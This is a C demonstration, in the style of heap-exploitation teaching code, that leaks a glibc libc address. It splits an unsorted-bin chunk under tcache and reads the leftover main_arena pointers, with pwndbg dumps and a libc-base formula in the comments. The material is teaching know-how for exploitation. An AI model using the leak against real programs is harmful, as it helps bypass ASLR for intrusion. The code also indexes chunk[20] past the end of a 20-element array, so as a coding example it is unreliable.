#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<malloc.h>
#include<assert.h>

int main(){
	printf("This demo shows how we can leak libc when we haven't UAF under tcache.\n");
	char *chunk[20];

	// 0x80 > 0x70(fastbin) 
	for(int i=0;i<7;i++)
		chunk[i] = malloc(0x80);
	chunk[7] = malloc(0x80);
	chunk[20] = malloc(0x10); // prevent merge

	// fill up tcache
	for(int i=0;i<7;i++)
		free(chunk[i]);
	free(chunk[7]); // unsorted bin

	// empty tcache bin
	for(int i=0;i<7;i++)
		chunk[8+i] = malloc(0x80);
	
	/*
	now we malloc(0x10) to trigger cutting from unsorted bin
	*/	
	
	/*
	Before we trigger:
	
	...
	
	Allocated chunk | PREV_INUSE
	Addr: 0x5555555595f0
	Size: 0x90 (with flag bits: 0x91)

	Free chunk (unsortedbin) | PREV_INUSE
	Addr: 0x555555559680
	Size: 0x90 (with flag bits: 0x91)
	fd: 0x7ffff7fafbe0
	bk: 0x7ffff7fafbe0

	Allocated chunk
	Addr: 0x555555559710
	Size: 0x20 (with flag bits: 0x20)

	Top chunk | PREV_INUSE
	Addr: 0x555555559730
	Size: 0x208d0 (with flag bits: 0x208d1)

	
	*/

	chunk[15] = malloc(0x10);

	/*
	After we trigger:
	
	...
	Allocated chunk | PREV_INUSE
	Addr: 0x5555555595f0
	Size: 0x90 (with flag bits: 0x91)

	Allocated chunk | PREV_INUSE
	Addr: 0x555555559680
	Size: 0x20 (with flag bits: 0x21)

	Free chunk (unsortedbin) | PREV_INUSE
	Addr: 0x5555555596a0
	Size: 0x70 (with flag bits: 0x71)
	fd: 0x7ffff7fafbe0
	bk: 0x7ffff7fafbe0

	Allocated chunk
	Addr: 0x555555559710
	Size: 0x20 (with flag bits: 0x20)

	Top chunk | PREV_INUSE
	Addr: 0x555555559730
	Size: 0x208d0 (with flag bits: 0x208d1)
		
	*/
	
	/*
	Now we can leak libc
	
	pwndbg> x /4gx 0x555555559680
	0x555555559680:	0x0000000000000000	0x0000000000000021
	0x555555559690:	0x00007ffff7fafc60	0x00007ffff7fafc60
	pwndbg> x /gx 0x00007ffff7fafc60
	0x7ffff7fafc60 <main_arena+224>:	0x00007ffff7fafc50

	*/
	
	long long *ptr = (long long *)chunk[15];
	long long leak = ptr[0];
	printf("Now we get leak is : %p ;\nwhich is actually the address: <main_arena+224>\nSo we can get :\nlibcbase = leak - 224 - 0x10 - libc.sym['__malloc_hook']\n",leak);
	
	return 0;
}
